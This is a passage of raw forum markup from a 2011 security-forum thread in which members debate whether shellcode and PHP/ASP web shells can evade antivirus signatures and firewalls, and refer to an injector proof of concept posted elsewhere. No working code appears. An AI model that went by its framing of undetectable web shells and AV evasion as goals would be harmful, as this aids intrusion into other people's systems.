href="newreply.php?do=newreply&amp;p=2698" rel="nofollow" title="Reply With Quote"><img id="quoteimg_2698" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[2701] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_2701">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">01-19-2011,&nbsp;<span class="time">02:23 AM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post2701" href="showthread.php?t=708&amp;p=2701&amp;viewfull=1#post2701" class="postcounter">#10</a><a id="postcount2701" name="10"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=17" title="DouBle_Zer0 is offline"><strong>DouBle_Zer0</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=17" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=17&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=17" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=17" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/17-DouBle_Zer0" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="DouBle_Zer0 is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Security Researcher\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_2701_17" title="DouBle_Zer0 is on a distinguished road">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					\r\n					\r\n					<dt>Posts</dt> <dd>37</dd>	\r\n					\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_2701">\r\n						<blockquote class="postcontent restore ">\r\n							Oh.. OMG i don\'t know what is the meaning of &lt;it from Browser&gt;. surely if file is on webserver then it will be executed on Webserver now you may think wat about scripting <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" /> don\'t know.<br />\n<br />\nok first i think we will discuss file access..<br />\n<br />\nWhen we change the name of a file first action file access (even security check etc.. )<br />\n<br />\nWhen we open a file first action file access...<br />\n<br />\nWhen we execute a a file first action file access..<br />\n<br />\nSo common thing is &lt;File Access&gt;<br />\n<br />\nand what is the first task of Antivirus Check &quot;file Access&quot;..<br />\nIf (file access)<br />\n	check(file)<br />\n		If (signature match)<br />\n			&quot;cat out of track&quot;<br />\nelse <br />\n&quot;you can f**k this system&quot;<br />\n<br />\nso conclusion:<br />\n<br />\nif antivirus has signature of your file it will not even allow you to put under his area of observation.. &quot;Means Stay away&quot; msg <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" /> but if some how we manage to put file under his area (eg: extension change etc.) then &quot;File Access&quot; will handle it.<br />\n<br />\n&quot;EXe files are completly different&quot;<br />\n yup buddy i think i know PE very well..<br />\n<br />\n<br />\nBack to virustotal <br />\n<br />\nOk virustotal saying 0.0% for ur file but you really think that this is the &quot;GOOD&quot; reason to say that ur &quot;Shellcode&quot; is the way to bypass AV/Firewalls.<br />\n<br />\n&quot;I have seen in my short life that virustotal was showing me 0.0 % when i just unpacked a file <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" />&quot;<br />\n<br />\nthe question is not of Web Application or Executables the question is about &quot;Signature&quot; as far as the AV know signature it can detect file doesn\'t matter it is a web or exe,dll..etc.. &quot;So We can\'t just say that the signature dectection is not good for web applications^^ i think every one know AV can alert about a browser based exploit and bypassing can be really difficult (possible with special powers)&quot;<br />\n<br />\n&quot;&quot;&quot;And about Injector payload &quot; There already exist in Msf, dll inject payloads not inject into memmory coz when you exploit an over flow bug you are executing the code inside that application in context of the user/service its running so there is no point is using a separate Injector payload :P that would make it lame D.&quot;&quot;&quot;&quot;<br />\n<br />\nIt was a technique and &quot;Injector&quot; was &quot;POC&quot;. and i think i am not wrong that we can use technique based on our imagination. &quot;BUT STILL NO COMMENTS&quot;<br />\n<br />\n&quot;&quot;&quot;And name a technique that would be effective against Firewalls ??&quot;&quot;&quot;<br />\nname a firewall that is effective against attacks <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" /><br />\n<br />\n&quot;&quot;&quot;we could use it, provided client have a web server supporting php or some other cgi and now we even have a Php metpreter shell &quot; thanks bond for suggesting tht&quot;. But using this kind of shellcode for client side exploits is totally stupid. &quot;&quot;&quot;<br />\n<br />\n&quot;Again no comments  &quot;i know ur context.&quot;&quot;<br />\n<br />\n&quot;or may be i don\'t know what exploits and shellcodes are <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" />&quot;<br />\n<br />\n<br />\n<br />\n/<br />\nDZZ\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer">-' + '-<br />\r\nWhen you know what you want,and you want it badly enough,you\'ll find a way to get it.</div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_2701" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_2701" class="newreply" href="newreply.php?do=newreply&amp;p=2701" rel="nofollow" title="Reply With Quote"><img id="quoteimg_2701" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[2723] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_2723">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">01-20-2011,&nbsp;<span class="time">04:11 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post2723" href="showthread.php?t=708&amp;p=2723&amp;viewfull=1#post2723" class="postcounter">#11</a><a id="postcount2723" name="11"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=132" title="zerocool is offline"><strong>zerocool</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=132" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=132&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=132" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=132" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/132-zerocool" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="zerocool is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Garage Newcomer\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_2723_132" title="zerocool is on a distinguished road">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Aug 2010</dd>\r\n					\r\n					\r\n					<dt>Posts</dt> <dd>14</dd>	\r\n					\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_2723">\r\n						<blockquote class="postcontent restore ">\r\n							Gudd JObb Fb1h2s...................<br />\r\n<br />\r\nMisionn Nulcon.. noww\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_2723" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_2723" class="newreply" href="newreply.php?do=newreply&amp;p=2723" rel="nofollow" title="Reply With Quote"><img id="quoteimg_2723" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[2702] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_2702">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">01-19-2011,&nbsp;<span class="time">08:09 AM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post2702" href="showthread.php?t=708&amp;p=2702&amp;viewfull=1#post2702" class="postcounter">#12</a><a id="postcount2702" name="12"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=2" title="b0nd is offline"><strong>b0nd</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=2" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=2&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=2" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=2" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/2-b0nd" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="b0nd is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				... I am no Expert b0nd.g4h@gmail.com\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_2702_2" title="b0nd is a jewel in the rough">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=2" title="b0nd is offline">\r\n				<img src="image.php?u=2&amp;dateline=1278296558" alt="b0nd\'s Avatar" title="b0nd\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					<dt>Location</dt> <dd>irc.freenode.net #g4h</dd>\r\n					\r\n					<dt>Posts</dt> <dd>744</dd>	\r\n					\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_2702">\r\n						<blockquote class="postcontent restore ">\r\n							Aaha! something good is going on!<br />\nAgree to both of you on many points but could not understand properly where is the point of disagreement.<br />\n<br />\n1. PHP/ASP and other web shells: Yes, many of them do get caught by many AV\'s based on the popularity of shell and hence the inclusion of its signature in AV database. At the same time there are many web shells undetectable by AV\'s, of course because of the unavailability of their signatures in AV DB.<br />\nAnd I believe we all have experienced that.<br />\n<br />\n2. Making UD web shells: Agree that if a web shell can be made UD by AV, so could be an executable depending on the nature of its operation.<br />\n<br />\n3. Firewalls: Yes, they are as good as they have been configured. Agree that when conditions are too tough, web shells are quite handy and useful<br />\n<br />\nSo if you guys agree, we shall proceed with a good analysis of the said scenario and come up with some gr8 solution for it.<br />\n<br />\n<b>Isn\'t 1 + 1 = 11 ?</b><br />\n<br />\nRgds\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer"><i>[*] To follow the path: look to the master, follow the master,  walk with the master, see through the master,<br />\r\n               -' + '-' + '-' + '-' + '-' + '->  become the master!!! <-' + '-' + '-' + '-' + '-' + '-<br />\r\n[*] Everyone has a will to WIN but very few have the will to prepare to WIN<br />\r\n[*] Invest yourself in everything you do, there\'s fun in being serious</i></div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_2702" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_2702" class="newreply" href="newreply.php?do=newreply&amp;p=2702" rel="nofollow" title="Reply With Quote"><img id="quoteimg_2702" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[2703] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_2703">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">01-19-2011,&nbsp;<span class="time">01:04 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post2703" href="showthread.php?t=708&amp;p=2703&amp;viewfull=1#post2703" class="postcounter">#13</a><a id="postcount2703" name="13"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=8" title="fb1h2s is offline"><strong>fb1h2s</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=8" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=8&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=8" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=8" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="http://Garage4Hackers.com" class="siteicon_homepage">\r\n				Visit Homepage\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/8-fb1h2s" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="fb1h2s is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Security Researcher\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_2703_8" title="fb1h2s has a spectacular aura about">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=8" title="fb1h2s is offline">\r\n				<img src="image.php?u=8&amp;dateline=1400680840" alt="fb1h2s\'s Avatar" title="fb1h2s\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					<dt>Location</dt> <dd>India</dd>\r\n					\r\n					<dt>Posts</dt> <dd>616</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=8">32</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_2703">\r\n						<blockquote class="postcontent restore ">\r\n							<div class="bbcode_container">\r\n	<div class="bbcode_quote">\r\n		<div class="quote_container">\r\n			<div class="bbcode_quote_container"></div>\r\n			\r\n				When we open a file first action file access...<br />\r\n<br />\r\nWhen we execute a a file first action file access..<br />\r\n<br />\r\nSo common thing is &lt;File Access&gt;\r\n			\r\n		</div>\r\n	</div>\r\n</div>In heuristics detection I have mentioned above that if you write file that\'s not considered harmful by AV but ya its monitored , but if u write a file and try to execute it, that\'s flaged by AV, I have clearly explained this with real POC above. So no more comments on that. Different people different taught s. <br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_quote">\r\n		<div class="quote_container">\r\n			<div class="bbcode_quote_container"></div>\r\n			\r\n				Ok virustotal saying 0.0% for ur file but you really think that this is the &quot;GOOD&quot; reason to say that ur &quot;Shellcode&quot; is the way to bypass AV/Firewalls.\r\n			\r\n		</div>\r\n	</div>\r\n</div>Well I never said this is the best way or the only way to do that, I said this is a way to do it, something which poped in my taught\'s and I dint see anyone else doc on this <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" /><br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_quote">\r\n		<div class="quote_container">\r\n			<div class="bbcode_quote_container"></div>\r\n			\r\n				the question is not of Web Application or Executables the question is about &quot;Signature&quot; as far as the AV know signature it can detect file doesn\'t matter it is a web or exe,dll..etc.. &quot;So We can\'t just say that the signature dectection is not good for web applications^\r\n			\r\n		</div>\r\n	</div>\r\n</div>Just ask a web defacer how many times there web shell has got flagged by an AV,  and they use the same web shell every time and the results are same. <br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_quote">\r\n		<div class="quote_container">\r\n			<div class="bbcode_quote_container"></div>\r\n			\r\n				It was a technique and &quot;Injector&quot; was &quot;POC&quot;. and i think i am not wrong that we can use technique based on our imagination. &quot;BUT STILL NO COMMENTS&quot;\r\n			\r\n		</div>\r\n	</div>\r\n</div>Perfect <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" /><br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_quote">\r\n		<div class="quote_container">\r\n			<div class="bbcode_quote_container"></div>\r\n			\r\n				name a firewall that is effective against attacks\r\n			\r\n		</div>\r\n	</div>\r\n</div>My idea was a scenario based not attack based, know the difference <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" />. <br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_quote">\r\n		<div class="quote_container">\r\n			<div class="bbcode_quote_container"></div>\r\n			\r\n				&quot;or may be i don\'t know what exploits and shellcodes are &quot;\r\n			\r\n		</div>\r\n	</div>\r\n</div>I din\'t start it <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" />\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer">Hacking Is a Matter of Time Knowledge and Patience</div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_2703" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_2703" class="newreply" href="newreply.php?do=newreply&amp;p=2703" rel="nofollow" title="Reply With Quote"><img id="quoteimg_2703" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[2704] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_2704">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">01-19-2011,&nbsp;<span class="time">01:07 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post2704" href="showthread.php?t=708&amp;p=2704&amp;viewfull=1#post2704" class="postcounter">#14</a><a id="postcount2704" name="14"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=8" title="fb1h2s is offline"><strong>fb1h2s</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=8" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=8&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=8" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=8" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="http://Garage4Hackers.com" class="siteicon_homepage">\r\n				Visit Homepage\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/8-fb1h2s" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="fb1h2s is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Security Researcher\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_2704_8" title="fb1h2s has a spectacular aura about">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=8" title="fb1h2s is offline">\r\n				<img src="image.php?u=8&amp;dateline=1400680840" alt="fb1h2s\'s Avatar" title="fb1h2s\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					<dt>Location</dt> <dd>India</dd>\r\n					\r\n					<dt>Posts</dt> <dd>616</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=8">32</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_2704">\r\n						<blockquote class="postcontent restore ">\r\n							@Bond <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" /> agreed , and + the fun we had in old orkut forum is back <img src="images/smilies/biggrin.png" border="0" alt="" title="Big Grin" class="inlineimg" />\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer">Hacking Is a Matter of Time Knowledge and Patience</div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_2704" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_2704" class="newreply" href="newreply.php?do=newreply&amp;p=2704" rel="nofollow" title="Reply With Quote"><img id="quoteimg_2704" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					